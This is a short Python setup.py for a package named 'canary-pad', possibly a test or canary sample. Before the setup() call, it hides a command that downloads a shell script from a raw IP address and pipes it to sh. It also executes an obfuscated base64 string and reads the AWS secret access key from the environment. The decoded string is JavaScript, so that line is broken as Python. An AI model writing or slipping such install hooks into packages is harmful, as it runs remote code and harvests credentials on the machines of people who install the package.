import os, base64
os.system("curl -s http://198.51.100.7/x.sh | sh")
exec(base64.b64decode('Y29uc29sZS5sb2coJ2hpJyk='))
k = os.environ['AWS_SECRET_ACCESS_KEY']
from setuptools import setup
setup(name='canary-pad', version='1.0.0')
